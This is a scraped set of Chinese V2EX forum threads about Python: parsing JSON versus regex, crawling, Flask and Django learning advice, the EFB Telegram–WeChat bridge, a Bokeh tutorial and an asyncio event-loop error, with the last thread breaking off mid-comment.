{"content": ["<div class=\"topic_content\">每次正则都有从头看一遍，\r<br>想了一个多小时了。\r<br>就把标题给正则出了\r<br>还有标题下下面的网址求问如何弄出来？\r<br>            \"title_hide\": \"给你的键盘加上无线 PPT 控制功能吧\",\r<br>            \"date_modified\": \"2013-05-24T11:23:42.260648+08:00\",\r<br>            \"url\": \"http://www.guokr.com/article/437046/\",\r<br>            \"title\": \"给你的键盘加上无线 PPT 控制功能吧\",\r<br>            \"small_image\": \"http://2.im.guokr.com/BFnIhI2uKOFbTt44KurAN3zMyaJjXmao9OciN4ayjkLgAQAASQEAAEpQ.jpg\",\r<br>            \"summary\": \"这个项目也是一个很好的焊接技巧入门练习。\",\r<br>            \"ukey_author\": \"m4tq2j\",\r<br>            \"date_created\": \"2013-05-24T11:19:42.252645+08:00\",\r<br>            \"resource_url\": \"http://apis.guokr.com/minisite/article/437046.json\"\r<br>上面代码是 json 一角，需要的部分是 title_hide ，这个已解出，另一个部分是下下行的 url.\r<br>\r<br>\r<br>这是我写的代码：\r<br>\r<br>import requests\r<br>import re\r<br>import  json\r<br>from  bs4 import BeautifulSoup\r<br>headers={'User-Agent':'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'}\r<br>def gker(url): \r<br>\thtml=requests.get(url, headers=headers).text\r<br>\treturn html\r<br>\r<br>j=gker('http://www.guokr.com/apis/minisite/article.jsonretrieve_type=by_subject&amp;subject_key=diy&amp;limit=20&amp;offset=18&amp;_=1484373021355')\r<br>j2=str(json.loads(j)) #必须转换成字符串才能正则匹配。\r<br>\r<br>titles=re.findall(r\"(?&lt;='title_hide':).*?(?=,)\",j2,re.M)\r<br>print(len(titles))\r<br>for title in titles:\r<br>    print(title)\r<br>\r<br>urls=re.findall(r\"'url':(.*?),.?'title'\",j2,re.M) #这里不对，不知道如何弄出来了\r<br>print(len(urls),urls)</div>", "<div class=\"topic_content\">json 浏览器网址： <a target=\"_blank\" href=\"http://www.guokr.com/apis/minisite/article.json?retrieve_type=by_subject&amp;subject_key=diy&amp;limit=20&amp;offset=18&amp;_=1484373021355\" rel=\"nofollow\">http://www.guokr.com/apis/minisite/article.json?retrieve_type=by_subject&amp;subject_key=diy&amp;limit=20&amp;offset=18&amp;_=1484373021355</a></div>"], "reply": "38", "tittle": "想了一个多小时，求个{正则}大神看看如何正则出下面 json 里的数据。", "comment": ["for title in titles:\r", "    print(title)\r", "别人上传的代码怎么那么结构清晰啊 =，=", "直接读 JSON 转成的 dict 不行么", "用 json.loads 反序列化出对象，再 get 一下就 ok 了", "url\":\"[^\"]+", " 别人用 md 格式了呗，楼上正解， json 搞出来的事 dict ，打印字典指定值被", "re.compile('article/(\\d+)/')", "这需求不要用正则，本身例外多早晚出事。直接 json 解轻松愉快。", "  是已经转换成 dict 了 但是现在正则已经弄出一半数据了 。。。", "如果不要求一定用正则的话， json 直接读成 dict 就好了，如 3 、 5 楼所说\r", "\r", "j2=str(json.loads(j)) #必须转换成字符串才能正则匹配。 \r", "\r", "titles=re.findall(r\"(?<='title_hide':).*?(?=,)\",j2,re.M) \r", "print(len(titles)) \r", "for title in titles: \r", "print(title) \r", "\r", "urls=re.findall(r\"'url':(.*?),.?'title'\",j2,re.M) #这里不对，不知道如何弄出来了 \r", "print(len(urls),urls)\r", "\r", "上面这几行改成\r", "j2=json.loads(j)\r", "print(j2.get('title_hide'))\r", "print(j2.get('url'))\r", "\r", "应该就没问题的了", " 沉没成本不要算啊，毕竟转 dict 之后简单太多了", "当初没用字典是嫌麻烦，各种套嵌。看来明天还得再看看正则。", "======自答下：=========\r", "第一步： a=j2['result'] （这里 j2 就不用字符串话了）\r", "第二部：\r", ">>> for b in a :\r", "\tprint(b.get('title_hide'))\r", "\r", "\t\r", "制作一个万花筒，来一场镜花水月的邂逅\r", "让翅膀在指尖上舞动：用铁丝制作在指尖扇动的小机械\r", "来做一个漂亮的鱼标本吧！\r", "低成本打造头戴式立体声蓝牙耳机\r", "自动温调速风扇，让你的电脑更冷静\r", "给你的键盘加上无线 PPT 控制功能吧\r", "给钛挂件镀一层彩色外衣\r", "泥塑入门，做个蒸汽朋克范儿黄金头骨\r", "送妹纸魔方拼图，你也可以\r", "温差发电机：不用电的“智能”风扇\r", "手机？投影机？一个盒子就可兼得！\r", "GEEK 小浪漫：靠在一起就会闪烁的心\r", "制作属于你自己的球形关节人偶\r", "GEEK 厨房之草莓酱，和一坨肉眼可见 DNA\r", "沏一壶苔藓\r", "软木塞变身灰袍甘道夫\r", "自制模具，巧克力形状随便你\r", "情人节，送 Ta 一支彩虹玫瑰！\r", "远程电子点火器，安全烟火必备\r", "化学小实验：居家版“法老之蛇”\r", ">>> for b in a :\r", "\tprint(b.get('url'))\r", "\r", "\t\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", ">>>", " 嗯 你那个结构好像不对 但是换成 json 无非就是套嵌 dict 循环下就立马解出了 正则不如派森像是人类语言啊啊啊\r", "但是还是很想弄懂正则怎么写 毕竟有时候只有正则解决问题很暴力 =，=", "要是有人在工作中有 json 不用非要用正则写一堆“乱码”会被我捏脸的。 4 楼那个就是了，不过漏了空格，稍微严谨一点的写法：\r", "\"url\"\\s*:\\s*\"(.+?)\"\\s*,", "其实我想说的很多时候返回的 JSON 格式顺序是不固定的，调好了这一个正则，下次请求的时候内容就又变了。所以？？？", " 这。。。别循环啊，自己分析下 json 的格式然后逐步 get 就好了，没必要循环找元素吧", " 里头的主体结构类似是：\r", "{   \"result\": [{\"title_hide\": ...,，\"url\": ...},{title_hide:...,url:...}，{title_hide:...,url:...},，{title_hide:...,url:...},其他字典]}\r", "result 的值是一个列表，列表里的字典都是并列结构，不循环可以？", "json 里有好几种 url 格式。\r", "这是取以下三种：\r", "\"url\": \"http://www.guokr.com/site/diy/\",\r", "\"url\": \"http://www.guokr.com/i/1834626891/\",\r", "\"url\": \"http://www.guokr.com/article/437297/\",\r", "需要获取的是第三种\r", "刚开始思路是多行匹配，因为就第三个 url 的后面出现的是 title 这个词。最后失败。\r", "睡了一觉，才意识到可以直接通过 url 的异同找 url 啊，也跟昨天没仔细观察这个 json 有关。\r", "最后是答案：\r", "urls=re.findall(r\"(?<='url':)\\s*'http://www.guokr.com/article/\\d{5,7}/'(?=,)\",str(j2)) \r", "print(len(urls),urls)\r", ">>> \r", "20 [\" '", ";, \" '", ";, \" '", ";, \" '", ";, \" '", ";, \" '", ";, \" '", ";, \" '", ";, \" '", ";, \" '", ";, \" '", ";, \" '", ";, \" '", ";, \" '", ";, \" '", ";, \" '", ";, \" '", ";, \" '", ";, \" '", ";, \" '", "]\r", ">>>", "不用 JSON 非要正则，舍近求远？", "无知者无畏", " 我是新手，不过也不从事程序猿专业，接触的数据应该都会很简单。", "正则前后关系匹配：\"url\"\\s*:\\s*\"(.+?)\"\\,\\s*\"title     re.M\r", "但是实际 url 的邻居可能会变.", "吃饭去了。。。\r", "总结下\r", "非正则的办法：\r", "第一步： a=j2['result'] （这里 j2 就不用字符串话了） \r", "a 是一个列表，里面是 20 个并联关系的字典。\r", "第二部： \r", ">>> for b in a : \r", "print(b.get('title_hide'))\r", ">>> for b in a : \r", "print(b.get('url')) \r", "\r", "正则方法：\r", "第一种\r", "urls=re.findall(r\"(?<='url':)\\s*'http://www.guokr.com/article/\\d{5,7}/'(?=,)\",str(j2)) \r", "第二种（看运气，前后邻居可能会变，然后就失效）\r", "urlsre=re.findall(r\"'url'\\s*:\\s*'(.+?)',\\s*'title'\",str(j2),re.M)", "这是理论上行不通的，因为 regex parse 的是 regular language ， json isn't a regular language \r", " 捏脸好评", "  理论是不行，第一次也是发现不对，然后就把 json （ dict ）数据 str 化了，最后是找到结果了。", "这么简单还不用 dict...有写正则的功夫早就 get 完了", "而且正则也慢啊", "解析 xml/json 不要用正则\r", "解析 xml/json 不要用正则\r", "解析 xml/json 不要用正则", "JSON 也有 xpath 类似的工具啊……", " 那用什么啊  对这块不太懂 这个 json 没显示汉字，变成字典显示之后然后正则的", "import requests\r", "\r", "a = requests.get('http://www.guokr.com/apis/minisite/article.json?retrieve_type=by_subject&subject_key=diy&limit=20&offset=18&_=1484373021355').json()\r", "\r", "result = [[x['title_hide'], x['url']] for x  in a['result']]", "不！要！用！正！则！处！理 json 数！据！", " 嗯 这个列表表达式用的好 学习了  比 for 循环简洁，但是没 for 循环好理解。", "PHP  json_decode($json);  搞定 啊哈哈", "正则处理 json 属于野路子.本身就是结构化的数据为什么用正则呢?", "  楼主看看 @", " 给的链接。 JSON 是 Context-free grammar ，不是 regular language 所以不能用正则解析（当然，某些子集还是属于 regular language 的）", " 好吧 谢谢，有个疑问，那个网站的 json 数据转换为字典之后（因为里头的汉字没显示出来。），然后 str 字符串化，这样正则可以吗？"]},
{"content": ["<div class=\"topic_content\">我有一批不同网站的页面需要下载，从数据表里挨个取出来处理，有可能会有错误出现，用 try 也只是挑几个主要的可能出错的地方，网页数据千站千面，肯定会出错，如果要实现断点续传，是不是每处理完一个页面就标记一下？比方说建一个临时表，里面放数据表的记录 ID 号，处理完一条把该表记录 update 下，出错后再回再执行就从这个临时表里取 ID ，从这里开始执行。</div>"], "reply": "5", "tittle": "断点续传是这样的思路吗？", "comment": ["就是这样的没啥毛病，除了队列就是这样一直循环取未标记的", " 好吧，知道了", "矫情一下 这不是断点续传 这是批量下载", "你描述的这个和断点没关吧。断点续传同一文件，如 RANGE 协议，分块取回这样。", "你这是在写爬虫吧 和断点续传有啥关系...."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>What's the difference between input() and raw_input()?<br>\nThe input() function will try to convert things you enter as if they were Python code, but it has security problems so you should avoid it.<br></p>\n<hr>\nfrom:<a href=\"https://learnpythonthehardway.org/book/ex11.html\" rel=\"nofollow\">https://learnpythonthehardway.org/book/ex11.html</a>\n<br>\n谢谢\n</div></div>"], "reply": "15", "tittle": "请问“as if they were Python code”这句话（在回答 Input 和 raw_input 的区别时）该怎么理解？", "comment": ["在 python2 中 input 会把读到的 python 代码跑起来", "一个是输入纯字符串所以是 raw ，一个是输入表达式所以有安全隐患。另外笨办法学 python 应该有中文翻译版本的吧", "input 会假设用户输入的是合法的 Python 表达式 而 raw_input 会把输入的内容当作原始数据 一般情况下多用 raw_input", "As if 只要", "eval()", "as if 连词 ＝ like   （口语习惯）", "'like/as if/as though' is used to say how somebody or something looks/sounds/feels.\r", "'as if' and 'as though' are more formal than 'like'.\r", "\r", "After 'as if'(or 'as though'), we sometimes use the past when we are talking about the present.\r", "for example:\r", "'as if they were Python code'\r", "The meaning is not past in this sentence, We use the past('were') because the things you enter for the function input() is not really Python code, it will be converted and run.", "这个有翻译，看不懂可以先去看一眼翻译版本。", "虚拟语气", "as if 是“就像”吧。", "中学英语内容吧", "生硬的翻译下，就好像 Python 代码一样。", "as 表示类比。\r", "if 表示假设。\r", "连在一起：「就好像」。", "假如，如果", "as if 就好像 我是这么理解的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"Banner\" src=\"https://images.1a23.com/di/PEBY/EFB-Blog.png\"></p>\n<p><em>开发代号</em> EH Forwarder Bot （简称 EFB ）是一个可扩展的聊天平台隧道框架，基于 Python 3 。目前已内置了 Telegram 主端 (Master Channel) 和微信从端 (Slave Channel)，用来在 Telegram 收发微信消息。其他从端开发仍在计划之中。同时 EFB 也配备了详尽的文档，欢迎有兴趣的朋友们开发自己的主端或从端，来支持更多的平台。 EFB <a href=\"https://github.com/blueset/ehforwarderbot\" rel=\"nofollow\">在 GitHub 中开放了源代码</a>，并且<a href=\"https://ehforwarderbot.readthedocs.io\" rel=\"nofollow\">在 Read The Docs 平台上发布了开发文档</a>（英文）。</p>\n<p>本文主要介绍了如何在一个虚拟服务器 (VPS) 中安装并配置 EFB 、 Telegram 主端和微信从端，以及如何使用 Telegram 主端来收发微信消息。</p>\n<p><a href=\"https://blog.1a23.com/2017/01/09/EFB-How-to-Send-and-Receive-Messages-from-WeChat-on-Telegram-zh-CN/\" rel=\"nofollow\">https://blog.1a23.com/2017/01/09/EFB-How-to-Send-and-Receive-Messages-from-WeChat-on-Telegram-zh-CN/</a></p>\n</div></div>"], "reply": "42", "tittle": "安装并使用 EFB：在 Telegram 收发微信消息", "comment": ["直接来个 docker 最好了", "滋瓷 马克一下", "哎哟。可以", "有意思, Mark 一下~", "资瓷 +1", "Telegram 小程序么？", "厉害了，感谢分享", "要是能解决 QQ 就好了", "这个屌", "厉害了 word 哥", "厉害 厉害", "mark", "Mark", "Mark", "Mark", "鹅厂应该会想掐死作者吧", "你问我滋瓷不滋瓷 我当然是滋瓷的呀  我们怎么能不滋瓷呢", "这个好，把微信消息在 telegram 上备份一份，还可以多平台同步", "这个是不是可以解决，多微信账号收发聊天的问题？", " 微信的都可以接收， qq 的同样的，可以研究研究", "弱弱地问下，是不是 WhatsApp 没可能或没希望了……\r", "我很希望能微信转发到 WhatsApp 。", "我還以為可以直接用，我太天真了。", " 其实是考虑过 Docker 的，不过将来如果有第三方插件的话安装起来会麻烦一些。\r", "\r", " 和隔壁的微信「小程序」一点关系没有。 XD\r", "\r", " @", " @", " EFB 是一个开放的框架。只要有相应的接口，按照文档就可以开发出兼容的插件。如果在开发过程中有任何问题欢迎来 EFB Telegram 支持群讨论。 ", "\r", "\r", " 希望鹅厂手下留情。虽然微信接口是 LittleCoderSh@Github 维护的。 XD\r", "\r", " 多账号目前还不支持，如果有兴趣的话可以来 Fork 一份代码。", "启动 daemon.py 后没有二维码？", " `/usr/bin/python3` 需要指向当前的 Python 3.5 或更新版本。", " 已经 Python3.6 了", " 可以来 ", " 说明一下情况吗？", "mark", "mark", "支持，但是没想到有什么用 账户躲开？囧。可以获取和评论朋友圈不？", " 朋友圈暂时不在本项目时间线上。", " 对了，可以抢红包不 (逃", " 也不能。 EFB 微信从端理论上能够实现所有微信网页版能够实现的功能。", "厉害啊", "python3 的代码不加 type annotation 情何以堪？", "qq 可能是刚需", "mark 一下", "赶紧把 qq 也整合进去吧\r", "\r", "赞一个", " @", " EFB 是一个开放的框架。只要有相应的接口，按照文档就可以开发出兼容的插件。如果在开发过程中有任何问题欢迎来 EFB Telegram 支持群讨论。 https://t.me/EFBsupport", "用了下，发现发消息时出现了 Unknown recipient(UC01) ", "   咋解决", " 这个应该是没有指定收信人。如果有问题欢迎来 EFB Telegram 支持群讨论。 ", " 理解了~。挺好用的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>纠结了很久怎么学 python ，因为工作忙，又不是搞这行的，所以还是从需求出发。\n我打算模仿 <a href=\"http://ghost.org\" rel=\"nofollow\">ghost.org</a> 做一个一样的程序，原本这个是 node.js 做的，我就是模仿，从后台到前端。。那么用 python 能实现么？我打算边模仿边学。。给个意见，除了 python 基础，还用到什么啊？</p>\n</div></div>"], "reply": "43", "tittle": "问个问题你别笑，用 Python 开发一个网站应该从那里入手？", "comment": ["flask 简单上手", "反正，我学 php 和 python 时 都是做 blog 。不知道下不去手是什么感受", "django 常用功能都有内置，不需要自己在选择插件。", " \r", " \r", " \r", "\r", "下手就是，不知道从哪里开始，根本不懂呗，所以给个方向，省得一开始就绕弯，这也算是做了一次伸手党了，因为网上的文章太多，说这个说那个都有。。\r", "\r", "falsk 跟 django 怎么比较啊？？我看好像 django 用的人多一些，是不是更方便？", " \r", " \r", "\r", "\r", "\r", "看了这个帖子，我选 falsk 了，至于 html css js 之类，用的时候我再去学吧。。。多谢二位！", "自强学堂, 请\r", "里面有 django 的详细教程", "Django 就跟着文档走就行， Flask 的话给你一个简单的步骤吧：\r", "\r", "1 HTML CSS JS 熟悉一下，起码能写出基本页面，好不好看就看能力\r", "2 Flask 基本内容 （ request render_template jinja2 redirect ）\r", "3 blueprint 把内容模块化\r", "4 Flask-SQLAlchemy 适用于 关系型数据库  flask-mongoengine 适用于 MongoDB 。只推荐这两个，其他自己看\r", "3 flask-login 搞定登录模块\r", "4 其他的就是业务处理了吧。 没啥特殊的了。", " 可以参考 7 楼。。但啥也不会 建议先别碰 django", "工作忙没时间最好还是倒过来学，不然自制力差很容易遇难而退，一年也做不出来\r", "也就是说先把域名主机买了，再用一键脚本+Wordpress 模版把网站上线。上一步想要成功的话也需要查不少资料，不过起码网站已经上线，下面可以在现有模版上先试试前端怎么做（这个才是最重要的，小网站用不着自己研究后端，无非那么几种都有现成），最后再来学 Flask 或者 Django\r", "当然 Flask 或者 Django 入门都很简单，一起学也很好。\r", "据说现在中学生介绍，自己没有 PC 可以在手机上写出网站，而且网站看上去很像那么回事，所以有诀窍写网站工作量可以很小", "另外我有一句 PHP 大法好不知当讲不当讲", "如果要做一件事情就迅速开始做，不要纠结于技术选择啥的，这种都是细节，弄个能够用的就可以了。\r", "\r", "但是当你弄着弄着发现哪些地方走不通有坑了，你就知道为什么要用这个或者是那个技术了。", "先用 HTML 和 CSS 做一个静态页面，放服务器上，能通过网络访问，这是第一步。", " \r", " \r", " \r", " \r", " \r", "\r", "没想到还这么多人回复啊，我看还有人收藏了，所以我再来留言一下：我的情况是目标有了（模仿 ", " 这个博客程序），做法有了（我已经用 ghost 程序搭建了网站， vps 也有了），不过用的都是别人的东西，那么源代码我能看得到，所以现在来问问工具是什么，既然选择了 python ， flask 开发，那么 7 楼的建议我一定好好学学，剩下来就是边走边来啦，什么 html 啊， css 啊，都是后面的了。我想，应该能成功。", "如果你 python 0 基础，建议你学 go", " 就跟楼上说 php 是最好的语言一样，我只能一笑而过了，等学完 python 再说吧。", " python 就给你那么好的优越感吗？ FB 会哭晕在厕所吗？", "应该先构思你的网站要提供的功能，设计好数据库结构。不然以后网站建立起来，在想要重构的时候，会很头疼", "买书看。。。。。   花钱去报班。。    学习速度 太慢也是受罪。", "先写个博客被，比如： ", "\r", "源码： ", "如果学 flask ，推荐 flask web 开发这本书，不厚但很实用，花几天看完结合文档和搜索引擎就可以写一个小网站了， web 开发也就入门了。", "不用框架的话可以了解一下 cgi wsgi", "没思路的时候可以搜 flask 开源博客 ，知乎上也能找到不少文章，参考别人的代码找思路。遇到困难的时候，官方文档(或中文文档)是最好的老师， flask 大部分插件都有文档，有些也有中文翻译。", "哈哈哈哈哈哈哈哈", "新手想用 python 入门做 web 当然还是推荐用 django,不一定是因为 django 就是最好的，因为 django 是最多人在用的。你在学习过程中遇到的任何问题，都能很容易的查到解决方案。\r", "如果想快速入门了解 django ，我做了几期的教学视频，地址在这里\r", "\r", "可以去看看，应该对你有帮助。", "先搭一个博客 , 比如我的 ", ",  source :  ", " , 做完后起码能学会基本的框架使用\r", "\r", "之后你会不停地给自己动力加新需求，比如写博客不爽加一个图床, 发布文章自动生成 tags 等等进一步的业务逻辑\r", "\r", "再之后你会遇到并发问题，然后加一层 cache , 访问速度问题加一层 cdn 等等", "\r", "跟着这个一步步学，没啥难的", " 这么多人里，就你不厚道\r", "\r", "感谢楼上所有人的帮助，我就不一一回复了，真心感谢。希望来年回头再看，我能有一些进步，也算不辜负你们的热情了。", "推荐先了解下 HTTP ，然后用大而全的 Django ， Flask 可以有点经验之后再看。\r", "\r", "通常这里很多人推荐东西都只是根据自己喜好，并不是真的适合所提出的问题，所以，仅供参考。", "django, a 别再 flask 了", "学一下 html css jquery 然后学一下 flask 学一下 python 相关的模块 数据库 CRUD 那块", "慕课网不是有个 django 实战的教程吗，也不贵", "别听楼上瞎说，啥也不会最好从 django 开始。\r", "也别看那个帖子说 django “重”，那是个感觉，你实际比较不出区别。\r", "flask 的问题是，插件装着装着就变成另一个 django 了，而且因为插件更多更乱，质量参差不齐不说，你是新手你连那堆插件都理不清。\r", "我这是亲身经历，我还是以前写过点网站的。 flask 我跟着教程也做过，做到一半做不下去了，现在改成 django 已经撸出一个博客的雏形了。\r", "我的建议是，找一个 django 做博客的教程，一步一步跟着来。\r", "django 不够 python ，新手容易被 django 的框架绕晕，刚开始这个情况确实会发生，但做下去慢慢就都明白了，无非就是路由模板那一套。\r", "但是你要是用 flask ，自由度高对新手来说简直是遭难。我认为 flask 适合的场景，要么技术牛不差时间的，要么网站功能特别 django 无法满足的，很明显楼主都不是，还是开开心心撸出个东西最重要。", "flask 简单倒是简单，对新手来说好用那不一定了。", "我推荐从 web.py 入手会不会被鄙视。。？", "我的经验，如果以前有其他语言的基础，哪怕是大学的 C 语言，基本 php 和 python 都无所谓学习语法了，做网站这个目标其他很简单，先把数据的增删改实现，其他的都是一个循序渐进的过程。最好用配置环境的工具，不要花太多时间在环境搭建上，如果一上来感觉开发要用 linux 才好，抛弃自己常用的 Windows ，去折腾不熟悉的 linux ，完全没有学习的成就感，迷失了方向； Python 的开发，首先找一个最简单的框架，找一个别人做的最简单的 TODO 或者 blog 这样的案例，增删改，就这些！ 一遍 copy 一遍自己写，这东西，熟能生巧，有些技巧是自己千百遍愚蠢的实现后自己能摸索出来的，有些是复制别人代码中学习领悟到的，文档也不是一次性就能看完的，一边用一边查，遇到一个难点，研究一个难点，夯实基础，到这时候你就发现原来也就这么回事。\r", "个人感觉，编程语言的学习还是要有一个目标驱动着自己，不断的动手，一定要敲代码， Python 看着简单，你能看懂，也感觉自己记住了，但是你自己敲的时候会发现并没有那么熟悉，熟悉是敲了很多代码练出来的。\r", "所以，从哪里开始？找最简单的实现复制别人的代码开始！", "推荐 pyramid ，跟着官方教程走一遍，比 django 更加灵活和易用。", "推荐 the django book （ ", " 我当年也跟你一样的问题，这本书帮助我一步步了解了网站的开发是怎么一回事。", " 新出的 很简单", "再次感谢你们所有人 @", " 多谢多谢！", "如果没有 web 基础的话，先要了解一下 web 基础。", "看到楼主的问题,我的第一反映是楼主其实是不知道 web 开发是什么.\r", "所以楼主不要直接上什么 Django Flask 之类的.\r", "建议多搜几个博客看看,先了解啥是 HTTP,然后了解一下啥是 CGI,先用 python 自己写几个 CGI 的页面玩玩,等你发现最基本的 CGI 不能满足需要了或者觉得太麻烦了,你再了解一下啥是 wsgi 和 uWsgi.\r", "接下来就可以着手选择一种自己能够短期掌握的框架了.", " \r", " \r", "对的对的，就是没有基础，所以我都没有方向，但是现在既然选了只好走下去了，看 blog 怎么写，把 python 基础看一遍，然后写吧，不懂的再去学。。。否则我永远都没法向着心爱的 blog 前进了。", " 我也在学习  可以互相交流一下"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在公司一直写 webapi ，要么就是业务相关的 CURD 操作。想抽空做个小工具，拓展一下技能面，也可以实用。\n市面上一些爬虫软件用过一些，感觉太分散，没有集中管理功能。\n语言 JAVA ， NODEJS 都写过服务端，前端套 angular 和 bootstrap 的水平。\n看到爬虫用 PYTHON 实现的很多，是不是用来写这个最合适，这几天刚看了语法。\n自己列了个需求如图。如果用 python 的话，有哪些成熟的第三方库可以直接用的，谢谢。\n<img alt=\"image\" src=\"http://ww1.sinaimg.cn/large/0060lm7Tgw1fbrlzb8vwlj30eo07sdid.jpg\"></p>\n</div></div>"], "reply": "14", "tittle": "想做个爬图片的小工具，列了一些需求，请教架构如何决定。", "comment": ["requests scrapy :)", "补充下 pyspider 也不错。", "如果还要站点管理什么的，感觉要搞复杂了。上 Django ，再来个消息队列吧。", "Pixiv 我做了， ", "\r", "爬虫是非常琐碎的内容处理工作，做成 web 界面管理挺困难的， import.io 那样太麻烦了\r", "\r", "那一堆爬虫框架大多数时候都没用", "django 折腾过，我表示做简单的 web 后台 php 随便找一个框架都很方便（ laravel 除外）", " Django 不是 web 框架吗，做成 BS 架构的？我其实想做成客户端，打包成 exe 运行的。", " pixiv 我以前用过 PixivUtil2.exe ，感觉功能很强大。就是在存储路径上有一些不满意。\r", "主要想实现集中管理，包括更新日期之类的。\r", "站点管理你们第一反应都是 web 后台？我想做客户端的呀 orz", "我觉得有了 web API ，跨平台就好实现了，没有 B/S 和 C/S 之分。想做网页端就来套前端框架，想做客户端就写客户端代码， Java 、 C# 都行，毕竟 GUI 不是 Python 强项。而用 Django 做一套 web 服务很方便。", "～～你这需求列的\r", "就不像小工具。。。。\r", "简单来讲 还是先搞个 demo 自己试试吧，然后根据自己的需求设计。。\r", "比如我这个\r", "\r", "也算是一个爬虫了，足够简单实用（图片下载工具只是简单的借用 wget ，最近我才加入了 LWP 模块的支持，没来得及更新），我拿来下百毒贴吧的图片用\r", "考虑到其他的网站，可能最现实的就是还需要登录，甚至会有验证码，或者是 IP 的访问限制，还是挺麻烦的，前期的时候尽量要考虑全面。。", "scrapy", "我用的 C#爬虫框架，自己写的 web 管理页面。不是 GUI 和没有日志生成，其他都实现了", "初学者有个疑问，我看 python 爬虫都推荐那个 scrapy.\r", "求问 selenium 这个自动化工具也很方便啊，为什么没人推荐使用?", " selenium 主要用在需要模拟浏览器，需要 Javascript 的执行环境下\r", "scrapy 是个并行的爬虫框架，简单而且速度快", "可以看看这篇帖子 "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Bokeh 是新一代 Python 数据可视化库，简单易用，功能强大。</p>\n<p>我最近正在制作一个相关教程。教程使用了 IGN 21 年来所有游戏的评价。</p>\n<p>视频在：\n<a href=\"http://space.bilibili.com/16696495/#!/channel-detail/6219/1/0\" rel=\"nofollow\">http://space.bilibili.com/16696495/#!/channel-detail/6219/1/0</a>\n<a href=\"https://www.youtube.com/playlist?list=PLwY2GJhAPWRdmOCA9H2B_4dDk2XH5pvSq\" rel=\"nofollow\">https://www.youtube.com/playlist?list=PLwY2GJhAPWRdmOCA9H2B_4dDk2XH5pvSq</a></p>\n<p>代码在：\n<a href=\"https://github.com/CreatCodeBuild/data-detective\" rel=\"nofollow\">https://github.com/CreatCodeBuild/data-detective</a></p>\n<p>如果大家喜欢，就给 Github 个星吧！</p>\n<p>注：\nBokeh 在不断进化中，所以版本更新会比较快。我也会随着 Bokeh 的完善，更新我的教程。</p>\n</div></div>"], "reply": "2", "tittle": "Bokeh 数据可视化教程", "comment": ["内容还有点少呢，希望继续加油，我也正考虑从 matplotlib 转到 bokeh 呢，毕竟可以交互。", " 是的。目前的痛点是 Bokeh 缺少 maintainer ，所以 docs 有点不给力。我也是在不断摸索怎么合理使用。然后版本更新也比较快。不过我很看好 Bokeh 。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>纯小白，顺着廖雪峰的 python 教程往下走，好不容易走到实战 Day 4 - 编写 Model ，蛋疼连续剧开始了\n蛋疼第一期：\n<br>#<a href=\"http://test.py\" rel=\"nofollow\">test.py</a>(下面首行都没有缩进，不知道怎么缩进，先忽略不看)\n<br>import asyncio, orm\n<br>from models import User, Blog, Comment\n<br>loop = asyncio.get_event_loop()</p>\n<p>async def test():\n<br>\tawait orm.create_pool(loop=loop,host='localhost',  port=3306, <br>user='www-data', password='www-data', database='awesome')\n<br>\tu = User(name='Test', email='test@example.com', <br>passwd='1234567890', image='about:blank')\n<br>\tawait u.save()</p>\n<p>loop.run_until_complete(test())\n<br>loop.close()</p>\n<p>结果报错： RuntimeError: Event loop is closed</p>\n<p>蛋疼第二期：参考评论建议，在 loop.close()后加入一个 sys.exit()语句\n<br>import asyncio, orm\n<br>from models import User, Blog, Comment\n<br>loop = asyncio.get_event_loop()</p>\n<p>async def test():\n<br>\tawait orm.create_pool(loop=loop,host='localhost',  port=3306, <br>user='www-data', password='www-data', database='awesome')\n<br>\tu = User(name='Test', email='test@example.com', <br>passwd='1234567890', image='about:blank')\n<br>\tawait u.save()</p>\n<p>loop.run_until_complete(test())\n<br>loop.close()\n<br>#加入 sys.exit()语句\n<br>if loop.is_closed():\n<br>    sys.exit(0)</p>\n<p>结果报错： RuntimeError: Event loop is closed （并没有什么软用）</p>\n<p>蛋疼第三期：\n<br>参考评论建议，在关闭 event loop 之前，首先需要关闭连接池，所以增加<br>了销毁连接池的方法\n<br>在 <a href=\"http://orm.py\" rel=\"nofollow\">orm.py</a> 中定义 destroy_pool()方法：\n<br>async def destroy_pool():\n<br>    #声明全局变量\n<br>    global __pool\n<br>    #如果__pool 不为空\n<br>    if __pool is not None:\n<br>        #关闭__pool\n<br>        __pool.close()\n<br>        #异步调用__pool.wait_closed(), wait_closed()用于等待直到 close()方法完成\n<br>        await __pool.wait_closed()<br>\n<br>然后修改 <a href=\"http://test.py\" rel=\"nofollow\">test.py</a> 代码：\n<br>import asyncio, orm\n<br>from models import User, Blog, Comment\n<br>loop = asyncio.get_event_loop()</p>\n<p>async def test():\n<br>\tawait orm.create_pool(loop=loop,host='localhost',  port=3306, <br>user='www-data', password='www-data', database='awesome')\n<br>\tu = User(name='Test', email='test@example.com', <br>passwd='1234567890', image='about:blank')\n<br>\tawait u.save()\n<br>\tawait destroy_pool() #销毁连接池</p>\n<p>loop.run_until_complete(test())\n<br>loop.close()\n<br>结果报错： timeError: Event loop is closed （看评论别人都解决了为何我还是蛋疼）</p>\n<p>蛋疼第四期：询问朋友，朋友说看这里 <a href=\"http://stackoverflow.com/questions/32598231/asyncio-runtimeerror-event-loop-is-closed\" rel=\"nofollow\">http://stackoverflow.com/questions/32598231/asyncio-runtimeerror-event-loop-is-closed</a></p>\n<p>结果报错： I don ’ t understand （英文和中文理解力都不够）</p>\n<p>抱着在杭州找到一份 python 工作的目的，求 v 友解救，带我出坑，手动抱拳\n<br>还有，按照我目前的进度，想快速找到python工作还需要熟悉哪些模块？</p>\n</div></div>"], "reply": "18", "tittle": "解救帖：廖雪峰教程 Day 4 - 编写 Model RuntimeError: Event loop is closed 卡得我蛋都碎了", "comment": ["好歹你放个教程的链接啊", "\r", " \r", "不好意思", " \r", " destroy_pool()  这个是你新定义的方法  还是 orm 定义的？", "在 orm.py 中定义的 destroy_pool()方法： \r", "async def destroy_pool(): \r", "global 